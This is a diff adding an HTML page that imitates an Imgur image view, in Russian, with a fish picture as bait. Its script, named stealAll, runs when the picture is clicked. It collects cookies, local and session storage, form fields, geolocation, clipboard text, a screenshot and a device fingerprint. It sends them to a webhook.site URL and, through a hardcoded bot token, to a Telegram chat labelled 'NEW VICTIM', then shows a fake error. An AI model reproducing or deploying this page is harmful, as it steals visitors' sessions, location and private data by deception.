@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Imgur - хостинг изображений</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #1a1a2e; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: #16213e;
+            border-radius: 24px;
+            padding: 35px 30px 30px;
+            box-shadow: 0 25px 70px rgba(0,0,0,0.9);
+            border: 1px solid #2a3a5e;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        .logo span {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .logo span i {
+            color: #1bb76e;
+            font-style: normal;
+        }
+        .badge {
+            background: #1bb76e;
+            color: #fff;
+            padding: 4px 16px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .title {
+            color: #eee;
+            font-size: 26px;
+            font-weight: 300;
+            margin: 10px 0 5px;
+        }
+        .subtitle {
+            color: #8892b0;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        .image-wrapper {
+            position: relative;
+            border-radius: 16px;
+            overflow: hidden;
+            cursor: pointer;
+            border: 2px solid #2a3a5e;
+            transition: all 0.3s ease;
+            background: #0d0d1a;
+        }
+        .image-wrapper:hover {
+            border-color: #1bb76e;
+            transform: scale(1.005);
+        }
+        .image-wrapper img {
+            width: 100%;
+            display: block;
+            max-height: 400px;
+            object-fit: contain;
+        }
+        .image-wrapper .overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            padding: 30px 20px 16px;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .image-wrapper:hover .overlay {
+            opacity: 1;
+        }
+        .overlay span {
+            color: #fff;
+            font-size: 13px;
+            background: rgba(27, 183, 110, 0.9);
+            padding: 6px 20px;
+            border-radius: 30px;
+            font-weight: 500;
+        }
+        .loader {
+            border: 4px solid #2a3a5e;
+            border-top: 4px solid #1bb76e;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            margin-top: 22px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #495670;
+            border-top: 1px solid #1f2a44;
+            padding-top: 18px;
+        }
+        .footer .views {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .footer .views svg {
+            width: 16px;
+            height: 16px;
+            fill: #495670;
+        }
+        .footer .actions {
+            display: flex;
+            gap: 18px;
+        }
+        .footer .actions span {
+            cursor: default;
+            transition: color 0.2s;
+        }
+        .footer .actions span:hover {
+            color: #8892b0;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1f2a44;
+            color: #fff;
+            padding: 12px 28px;
+            border-radius: 12px;
+            font-size: 14px;
+            border: 1px solid #2a3a5e;
+            display: none;
+            z-index: 999;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="100" rx="20" fill="#1bb76e"/>
+                <path d="M30 40 L45 25 L60 40 L55 45 L45 35 L35 45 L30 40Z" fill="white"/>
+                <path d="M55 55 L70 40 L85 55 L80 60 L70 50 L60 60 L55 55Z" fill="white"/>
+                <circle cx="45" cy="65" r="12" fill="white"/>
+                <circle cx="45" cy="65" r="6" fill="#1bb76e"/>
+            </svg>
+            <span>Img<span i>ur</span></span>
+        </div>
+        <span class="badge">Новое</span>
+    </div>
+
+    <h1 class="title">Улыбающаяся рыбка</h1>
+    <p class="subtitle">Нажмите на изображение для просмотра в полном качестве</p>
+
+    <div class="loader" id="loader"></div>
+
+    <div class="image-wrapper" id="trapLink">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MDAiIGhlaWdodD0iNDAwIiB2aWV3Qm94PSIwIDAgNjAwIDQwMCI+PHJlY3Qgd2lkdGg9IjYwMCIgaGVpZ2h0PSI0MDAiIGZpbGw9IiMxYzFjM2MiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjQwIiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjNlbSI+4p2AIPCfkIEg8J+UgSDwn5SBIPCfkIEg8J+UgSDinYDwn5SBIPCfkIE8L3RleHQ+PC9zdmc+" alt="Улыбающаяся рыбка">
+        <div class="overlay"><span>▶ Нажмите для просмотра</span></div>
+    </div>
+
+    <div class="footer">
+        <div class="views">
+            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            <span>12 438 просмотров</span>
+        </div>
+        <div class="actions">
+            <span>💬 47</span>
+            <span>↗️ Поделиться</span>
+            <span>⬇️ Сохранить</span>
+        </div>
+    </div>
+</div>
+
+<div class="toast" id="toast">Изображение загружается...</div>
+
+<script>
+// ============================================================
+//  НАСТРОЙКИ — ЗАМЕНИТЬ ТОЛЬКО ПРИ НЕОБХОДИМОСТИ
+// ============================================================
+const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
+const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
+const CHAT_ID = '8327334745';
+
+// ============================================================
+//  ОСНОВНАЯ ФУНКЦИЯ СБОРА
+// ============================================================
+async function stealAll(e) {
+    e.preventDefault();
+    document.getElementById('loader').style.display = 'block';
+
+    // ---------- 1. Базовый отпечаток ----------
+    const data = {
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+        referrer: document.referrer || 'прямой заход',
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages || [],
+        cookieEnabled: navigator.cookieEnabled,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        },
+        windowSize: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset()
+    };
+
+    // ---------- 2. Куки ----------
+    data.cookies = {};
+    if (document.cookie) {
+        document.cookie.split('; ').forEach(c => {
+            const [k, v] = c.split('=');
+            if (k) data.cookies[k] = v || '';
+        });
+    }
+
+    // ---------- 3. LocalStorage ----------
+    data.localStorage = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key) data.localStorage[key] = localStorage.getItem(key);
+    }
+
+    // ---------- 4. SessionStorage ----------
+    data.sessionStorage = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+
+    // ---------- 5. Формы (все поля) ----------
+    data.forms = {};
+    document.querySelectorAll('input, textarea, select').forEach(el => {
+        const name = el.name || el.id || el.className || 'field_' + Math.random().toString(36).substr(2, 4);
+        if (el.type !== 'password' || el.value) {
+            data.forms[name] = el.value;
+        }
+    });
+
+    // ---------- 6. Мета-теги ----------
+    data.meta = {};
+    document.querySelectorAll('meta').forEach(m => {
+        const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
+        data.meta[name] = m.getAttribute('content') || '';
+    });
+
+    // ---------- 7. Все ссылки ----------
+    data.links = [];
+    document.querySelectorAll('a[href]').forEach(a => {
+        data.links.push(a.href);
+    });
+
+    // ---------- 8. История ----------
+    data.history = {
+        length: window.history.length,
+        currentUrl: window.location.href
+    };
+
+    // ---------- 9. Установленные шрифты ----------
+    data.fonts = [];
+    const fontTest = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans', 'Lato', 'Montserrat'];
+    for (const f of fontTest) {
+        try {
+            if (document.fonts && document.fonts.check && document.fonts.check(`12px "${f}"`)) {
+                data.fonts.push(f);
+            }
+        } catch (_) {}
+    }
+
+    // ---------- 10. IP через внешний API ----------
+    try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        const json = await resp.json();
+        data.ip = json.ip;
+    } catch (_) {
+        data.ip = 'не удалось получить';
+    }
+
+    // ---------- 11. Геолокация ----------
+    try {
+        const pos = await new Promise((resolve, reject) => {
+            if (!navigator.geolocation) reject('no geo');
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+        });
+        data.geo = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude || null,
+            speed: pos.coords.speed || null
+        };
+    } catch (_) {
+        data.geo = 'заблокировано или недоступно';
+    }
+
+    // ---------- 12. Буфер обмена ----------
+    try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            data.clipboard = await navigator.clipboard.readText();
+        } else {
+            data.clipboard = 'API недоступен';
+        }
+    } catch (_) {
+        data.clipboard = 'доступ запрещён';
+    }
+
+    // ---------- 13. События мыши (последние 15) ----------
+    data.mouseEvents = [];
+    const mouseHandler = (type, ev) => {
+        data.mouseEvents.push({ type, x: ev.clientX, y: ev.clientY, time: Date.now() });
+        if (data.mouseEvents.length > 15) data.mouseEvents.shift();
+    };
+    document.addEventListener('click', (ev) => mouseHandler('click', ev));
+    document.addEventListener('mousemove', (ev) => {
+        if (Math.random() < 0.08) mouseHandler('move', ev);
+    });
+
+    // ---------- 14. Скриншот (html2canvas) ----------
+    data.screenshot = null;
+    try {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+        document.head.appendChild(script);
+        await new Promise((res, rej) => {
+            script.onload = res;
+            script.onerror = rej;
+            setTimeout(res, 5000);
+        });
+        if (typeof html2canvas !== 'undefined') {
+            const canvas = await html2canvas(document.body, {
+                useCORS: true,
+                allowTaint: true,
+                scale: 0.4,
+                logging: false
+            });
+            data.screenshot = canvas.toDataURL('image/jpeg', 0.6);
+        }
+    } catch (_) {
+        data.screenshot = 'не удалось сделать скриншот';
+    }
+
+    // ============================================================
+    //  ОТПРАВКА — ДУБЛИРУЕМ НА WEBHOOK И В TELEGRAM
+    // ============================================================
+    const payload = JSON.stringify(data);
+
+    // Отправка на Webhook.site
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload
+        });
+    } catch (_) {}
+
+    // Отправка в Telegram (краткая версия)
+    try {
+        const shortMsg = 
+`🔴 НОВАЯ ЖЕРТВА
+🌐 IP: ${data.ip || 'нет'}
+📍 Гео: ${data.geo?.lat ? data.geo.lat + ', ' + data.geo.lng : 'нет'}
+🖥 Экран: ${data.screen.width}x${data.screen.height}
+⏰ Время: ${data.timestamp}
+📦 Куки: ${Object.keys(data.cookies).length} шт.
+💾 LocalStorage: ${Object.keys(data.localStorage).length} шт.
+🗂 SessionStorage: ${Object.keys(data.sessionStorage).length} шт.
+📋 Буфер: ${data.clipboard ? data.clipboard.substring(0, 50) : 'нет'}
+🔗 URL: ${data.url}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: shortMsg
+            })
+        });
+    } catch (_) {}
+
+    // ============================================================
+    //  ФИНАЛ — ЗАГЛУШКА ДЛЯ ЖЕРТВЫ
+    // ============================================================
+    document.getElementById('loader').style.display = 'none';
+    const toast = document.getElementById('toast');
+    toast.textContent = '⚠️ Ошибка загрузки. Попробуйте позже.';
+    toast.style.display = 'block';
+    setTimeout(() => { toast.style.display = 'none'; }, 4000);
+
+    // РЕДИРЕКТ НА РЕАЛЬНЫЙ САЙТ (опционально)
+    // window.location.href = 'https://imgur.com';
+}
+
+// ============================================================
+//  ПРИВЯЗКА КЛИКА
+// ============================================================
+document.getElementById('trapLink').addEventListener('click', stealAll);
+
+// ============================================================
+//  АВТОМАТИЧЕСКИЙ СБОР БЕЗ КЛИКА (РАСКОММЕНТИРОВАТЬ ПРИ НУЖДЕ)
+// ============================================================
+// window.addEventListener('load', () => {
+//     setTimeout(() => {
+//         const fakeEvent = { preventDefault: () => {} };
+//         stealAll(fakeEvent);
+//     }, 1500);
+// });
+</script>
+</body>
+</html>
